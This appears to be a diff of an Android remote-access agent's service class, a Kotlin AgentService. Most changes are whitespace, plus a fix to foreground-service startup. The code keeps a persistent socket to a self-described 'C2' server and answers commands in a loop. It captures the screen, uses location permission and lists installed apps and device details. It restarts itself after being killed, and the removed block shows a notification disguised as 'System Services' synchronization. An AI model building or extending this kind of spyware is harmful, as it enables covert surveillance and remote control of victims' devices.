@@ -64,18 +64,18 @@ class AgentService : Service() {
     private val isAgentRunning = AtomicBoolean(false)
     private var wakeLock: PowerManager.WakeLock? = null
     private var wifiLock: WifiManager.WifiLock? = null
-    
+
     // File lock for single-instance guarantee across processes
     private var lockFile: RandomAccessFile? = null
     private var fileChannel: FileChannel? = null
     private var fileLock: FileLock? = null
-    
+
     // Port lock guarding C2 connection (Process Mutex)
     private var portLockSocket: ServerSocket? = null
-    
+
     // Reference to the active C2 connection socket to allow forcing closure on destroy
     private var c2Socket: Socket? = null
-    
+
     @Volatile
     private var keepRunning = true
     private var agentThread: Thread? = null
@@ -106,7 +106,7 @@ class AgentService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         keepRunning = false
-        
+
         // Interrupt the background thread to break any blocking I/O or sleep
         agentThread?.interrupt()
         screenCaptureThread?.interrupt()
@@ -115,14 +115,14 @@ class AgentService : Service() {
         virtualDisplay?.release()
         imageReader?.close()
         mediaProjection?.stop()
-        
+
         if (wakeLock?.isHeld == true) {
             wakeLock?.release()
         }
         if (wifiLock?.isHeld == true) {
             wifiLock?.release()
         }
-        
+
         releaseProcessLock()
         scheduleRestart(this)
     }
@@ -146,23 +146,23 @@ class AgentService : Service() {
             restartIntent,
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
-        
+
         val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager
         // If exact alarm permission is granted, use it. Otherwise approximate.
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-             if (alarmManager?.canScheduleExactAlarms() == true) {
-                 alarmManager.setExactAndAllowWhileIdle(
-                     AlarmManager.RTC_WAKEUP,
-                     System.currentTimeMillis() + 1000,
-                     pendingIntent
-                 )
-             } else {
-                 alarmManager?.setAndAllowWhileIdle(
-                     AlarmManager.RTC_WAKEUP,
-                     System.currentTimeMillis() + 1000,
-                     pendingIntent
-                 )
-             }
+            if (alarmManager?.canScheduleExactAlarms() == true) {
+                alarmManager.setExactAndAllowWhileIdle(
+                    AlarmManager.RTC_WAKEUP,
+                    System.currentTimeMillis() + 1000,
+                    pendingIntent
+                )
+            } else {
+                alarmManager?.setAndAllowWhileIdle(
+                    AlarmManager.RTC_WAKEUP,
+                    System.currentTimeMillis() + 1000,
+                    pendingIntent
+                )
+            }
         } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             alarmManager?.setExactAndAllowWhileIdle(
                 AlarmManager.RTC_WAKEUP,
@@ -182,57 +182,20 @@ class AgentService : Service() {
 
     @RequiresPermission(allOf = [Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION])
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        try {
-            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("System Services")
-                .setContentText("Running background synchronization")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
-                .build()
+        // Start foreground immediately with a permission-safe service type.
+        // startForegroundWithNotification() checks location permission at runtime before
+        // including FOREGROUND_SERVICE_TYPE_LOCATION, preventing the SecurityException crash.
+        startForegroundWithNotification()
 
-            // On API 29+ we must pass the foreground service type(s) declared in the manifest.
-            // On Android 14+ (API 34+) omitting the type throws MissingForegroundServiceTypeException.
-            // IMPORTANT: only include FOREGROUND_SERVICE_TYPE_LOCATION if the permission is already
-            // granted — passing it without permission throws SecurityException and crashes the service.
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                val hasLocation = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) ==
-                        android.content.pm.PackageManager.PERMISSION_GRANTED ||
-                        checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) ==
-                        android.content.pm.PackageManager.PERMISSION_GRANTED
-
-                val serviceType = if (hasLocation) {
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
-                } else {
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-                }
-                startForeground(NOTIFICATION_ID, notification, serviceType)
-            } else {
-                startForeground(NOTIFICATION_ID, notification)
-            }
-        } catch (e: Exception) {
-            Log.e("AgentService", "Error starting foreground service", e)
-            // Fallback: try starting without explicit type if possible or just continue (service might be killed)
-            try {
-                val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-                    .setContentTitle("System Services")
-                    .setContentText("Running background synchronization")
-                    .setSmallIcon(android.R.drawable.stat_notify_sync)
-                    .build()
-                startForeground(NOTIFICATION_ID, notification)
-            } catch (e2: Exception) {
-                Log.e("AgentService", "Failed to start foreground service", e2)
-            }
-        }
-
-        // NEW: Handle screen share request from HomeScreen - Process ALWAYS, even if agent is running
+        // Handle screen share request from HomeScreen - Process ALWAYS, even if agent is running
         if (intent?.action == "START_SCREEN_SHARE") {
-             val projectionIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                 intent.getParcelableExtra("projection_intent", Intent::class.java)
-             } else {
-                 @Suppress("DEPRECATION")
-                 intent.getParcelableExtra("projection_intent")
-             }
-             projectionIntent?.let { startScreenCapture(it) }
+            val projectionIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                intent.getParcelableExtra("projection_intent", Intent::class.java)
+            } else {
+                @Suppress("DEPRECATION")
+                intent.getParcelableExtra("projection_intent")
+            }
+            projectionIntent?.let { startScreenCapture(it) }
         }
 
         // Schedule a watchdog alarm to ensure the service stays alive (or revives if killed)
@@ -241,8 +204,6 @@ class AgentService : Service() {
         // Guard against multiple threads being spawned if onStartCommand is called again
         // (e.g. from both MainActivity and BootReceiver, or on service restart via START_STICKY)
         if (isAgentRunning.compareAndSet(false, true)) {
-            startForegroundWithNotification()
-
             if (acquireProcessLock()) {
                 // Only delay on boot — not on restarts caused by permission changes or system kills
                 val fromBoot = intent?.getBooleanExtra("from_boot", false) ?: false
@@ -266,12 +227,31 @@ class AgentService : Service() {
             .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(
-                NOTIFICATION_ID,
-                notification,
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
-                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
-            )
+            // IMPORTANT: only include FOREGROUND_SERVICE_TYPE_LOCATION if the permission is already
+            // granted at runtime — passing it without a granted permission throws SecurityException
+            // on SDK 34+ and crashes the service (this was the original crash bug).
+            val hasLocation = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) ==
+                    android.content.pm.PackageManager.PERMISSION_GRANTED ||
+                    checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) ==
+                    android.content.pm.PackageManager.PERMISSION_GRANTED
+
+            val serviceType = if (hasLocation) {
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+            } else {
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+            }
+
+            try {
+                startForeground(NOTIFICATION_ID, notification, serviceType)
+            } catch (e: Exception) {
+                Log.e("AgentService", "startForeground failed, retrying with DATA_SYNC only", e)
+                // Last-resort fallback: drop location type if system still rejects it
+                try {
+                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                } catch (e2: Exception) {
+                    Log.e("AgentService", "startForeground failed entirely", e2)
+                }
+            }
         } else {
             startForeground(NOTIFICATION_ID, notification)
         }
@@ -295,7 +275,7 @@ class AgentService : Service() {
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
                             ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                         else 0
-                
+
                 startForeground(NOTIFICATION_ID, notification, serviceType)
             } else {
                 startForeground(NOTIFICATION_ID, notification)
@@ -310,7 +290,7 @@ class AgentService : Service() {
             val density = metrics.densityDpi
 
             imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
-            
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                 mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                     override fun onStop() {
@@ -408,7 +388,7 @@ class AgentService : Service() {
             // tryLock() is non-blocking. Returns null if lock is held by another process.
             // On Android, file locks are advisory but effective for cooperation between our own processes.
             fileLock = fileChannel?.tryLock()
-            
+
             if (fileLock == null) {
                 Log.w("AgentService", "Another process holds the lock.")
                 closeLockResources()
@@ -499,10 +479,10 @@ class AgentService : Service() {
         agentThread = Thread {
             // General Startup Delay: Reduced to 500ms for faster responsiveness while still allowing
             // a brief window for the previous connection to clear on the server side.
-            try { 
-                Thread.sleep(500) 
-            } catch (e: InterruptedException) { 
-                return@Thread 
+            try {
+                Thread.sleep(500)
+            } catch (e: InterruptedException) {
+                return@Thread
             }
 
             // BLOCKING LOCK ACQUISITION
@@ -526,20 +506,20 @@ class AgentService : Service() {
                         val socket = Socket()
                         socket.keepAlive = true
                         // socket.connect(InetSocketAddress(ip, port), 5000)
-                        
+
                         // Use a longer timeout for connect, and set a read timeout to detect dead server
                         // socket.soTimeout = 0 // Infinite timeout is risky if NAT drops
                         // socket.soTimeout = 120000 // 2 minutes? No, let's stick to infinite but rely on keepAlive
-                        
+
                         socket.connect(InetSocketAddress(ip, port), 10000)
-                        
+
                         // Use BufferedReader instead of Scanner for more robust line reading
                         val reader = BufferedReader(InputStreamReader(socket.getInputStream()))
                         val output = PrintWriter(socket.getOutputStream(), true)
 
                         while (keepRunning) {
                             val command = reader.readLine() ?: break // null means stream closed (EOF)
-                            
+
                             // Copy your command logic from MainActivity here
                             val response = when {
                                 command == "ping" -> "pong"
@@ -606,10 +586,10 @@ class AgentService : Service() {
                             }
                             output.println(response)
                         }
-                        
+
                         // If we break out, it means EOF (server closed connection)
                         Log.i("AgentService", "Server closed connection")
-                        
+
                     } catch (e: Throwable) {
                         // Check if we were interrupted (service stopping)
                         if (!keepRunning || e is InterruptedException) {
@@ -617,7 +597,7 @@ class AgentService : Service() {
                             break
                         }
                         Log.e("AgentService", "Connection failed or error occurred, retrying in 10s: ${e.message}")
-                        
+
                         try {
                             Thread.sleep(10000) // Wait longer between retries
                         } catch (sleepEx: InterruptedException) {
@@ -628,20 +608,20 @@ class AgentService : Service() {
             } finally {
                 // Allow a new thread to be started if this one ever exits
                 isAgentRunning.set(false)
-                
+
                 // Cleanup C2 socket reference immediately to break connection
                 try {
                     c2Socket?.close()
                 } catch (e: Exception) {}
                 c2Socket = null
-                
+
                 // EXIT GAP:
                 // Hold the port lock for a brief moment AFTER disconnecting C2.
                 // This blocks any eager new instance from connecting until we are truly gone.
                 try {
                     Thread.sleep(2000)
                 } catch (e: Exception) {}
-                
+
                 // Release the global lock so next instance can take it
                 try {
                     portLockSocket?.close()
@@ -650,7 +630,7 @@ class AgentService : Service() {
         }
         agentThread?.start()
     }
-    
+
     private fun acquirePortLock(): Boolean {
         return try {
             // Bind specifically to IPv4 loopback to avoid ambiguity
@@ -664,15 +644,15 @@ class AgentService : Service() {
             try { Thread.sleep(200) } catch (i: InterruptedException) { return false }
             // If failed to bind, check if we should keep trying
             if (keepRunning) {
-                 // Simple recursive retry or just return false to let the loop handle it
-                 // But here we want to block until acquired or timed out.
-                 // Refactored simple retry loop below:
-                 return acquirePortLockRetryLoop()
+                // Simple recursive retry or just return false to let the loop handle it
+                // But here we want to block until acquired or timed out.
+                // Refactored simple retry loop below:
+                return acquirePortLockRetryLoop()
             }
             false
         }
     }
-    
+
     private fun acquirePortLockRetryLoop(): Boolean {
         var attempts = 0
         while (keepRunning && attempts < 50) { // 50 * 200ms = 10s max wait
@@ -694,10 +674,10 @@ class AgentService : Service() {
         val manufacturer = Build.MANUFACTURER
         val model = Build.MODEL
         var userDeviceName: String? = null
-        
+
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N_MR1) { // API 25
-                 userDeviceName = Settings.Global.getString(contentResolver, Settings.Global.DEVICE_NAME)
+                userDeviceName = Settings.Global.getString(contentResolver, Settings.Global.DEVICE_NAME)
             }
         } catch (e: Exception) {
             // Ignore if we can't get the user-set name
@@ -712,7 +692,7 @@ class AgentService : Service() {
 
     private fun getBatteryLevel(): String {
         val batteryStatus: Intent? = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
-        
+
         if (batteryStatus == null) return "Error: Could not retrieve battery stats"
 
         val level: Int = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
@@ -780,29 +760,29 @@ class AgentService : Service() {
                 }
             }
             if (currentNow != Int.MIN_VALUE) {
-                 // Some devices report in µA (standard), others in mA (non-standard).
-                 // Use a heuristic: active phone usually draws > 100mA.
-                 // If absolute value is > 10000, it's likely in µA (or just very high consumption/charging).
-                 // If absolute value is < 10000, it's likely already in mA (e.g. 1620 raw = 1.6A, not 1.6mA).
-                 val isMicroAmperes = Math.abs(currentNow) > 10000
-                 val currentMa = if (isMicroAmperes) currentNow / 1000.0 else currentNow.toDouble()
-                 append(String.format(Locale.US, "Current Now: %.1f mA\n", currentMa))
+                // Some devices report in µA (standard), others in mA (non-standard).
+                // Use a heuristic: active phone usually draws > 100mA.
+                // If absolute value is > 10000, it's likely in µA (or just very high consumption/charging).
+                // If absolute value is < 10000, it's likely already in mA (e.g. 1620 raw = 1.6A, not 1.6mA).
+                val isMicroAmperes = Math.abs(currentNow) > 10000
+                val currentMa = if (isMicroAmperes) currentNow / 1000.0 else currentNow.toDouble()
+                append(String.format(Locale.US, "Current Now: %.1f mA\n", currentMa))
             }
             if (currentAverage != Int.MIN_VALUE) {
-                 val isMicroAmperes = Math.abs(currentAverage) > 10000
-                 val currentAvgMa = if (isMicroAmperes) currentAverage / 1000.0 else currentAverage.toDouble()
-                 append(String.format(Locale.US, "Current Average: %.1f mA\n", currentAvgMa))
+                val isMicroAmperes = Math.abs(currentAverage) > 10000
+                val currentAvgMa = if (isMicroAmperes) currentAverage / 1000.0 else currentAverage.toDouble()
+                append(String.format(Locale.US, "Current Average: %.1f mA\n", currentAvgMa))
             }
         }.trim()
     }
 
     private fun getDeviceStats(): String {
         val sb = StringBuilder()
-        
+
         val actManager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
         val memInfo = android.app.ActivityManager.MemoryInfo()
         actManager.getMemoryInfo(memInfo)
-        
+
         // RAM is typically reported in Binary units (GiB) by the OS
         // 1 GiB = 1024 * 1024 * 1024 bytes
         val totalMem = memInfo.totalMem / (1024.0 * 1024.0 * 1024.0)
@@ -816,7 +796,7 @@ class AgentService : Service() {
             }
         }
         sb.append("\n")
-        
+
         // Storage is typically reported in Decimal units (GB) to match marketing capacity
         // 1 GB = 1000 * 1000 * 1000 bytes
         var storageTotalBytes: Long = 0
@@ -843,10 +823,10 @@ class AgentService : Service() {
 
         // Convert Total to GB (Decimal, 1000^3) to match marketing and physical label
         val totalGb = storageTotalBytes / (1000.0 * 1000.0 * 1000.0)
-        
+
         // Convert Free to GB (Decimal, 1000^3) to match Android Files app reporting
         val freeGb = storageFreeBytes / (1000.0 * 1000.0 * 1000.0)
-        
+
         sb.append(String.format(Locale.US, "Internal Storage: %.2fGB Free / %.2fGB Total\n", freeGb, totalGb))
 
         // CPU Architecture
@@ -1018,7 +998,7 @@ class AgentService : Service() {
         // Note: On Android 11 (API 30) and higher, QUERY_ALL_PACKAGES permission 
         // in AndroidManifest.xml is required to see all other installed apps.
         val apps = pm.getInstalledApplications(0)
-        
+
         return apps.map { appInfo ->
             val appName = pm.getApplicationLabel(appInfo).toString()
             val packageName = appInfo.packageName
@@ -1029,7 +1009,7 @@ class AgentService : Service() {
     private fun getUserInstalledApps(): String {
         val pm = packageManager
         val apps = pm.getInstalledApplications(0)
-        
+
         return apps.filter { appInfo ->
             (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0
         }.map { appInfo ->
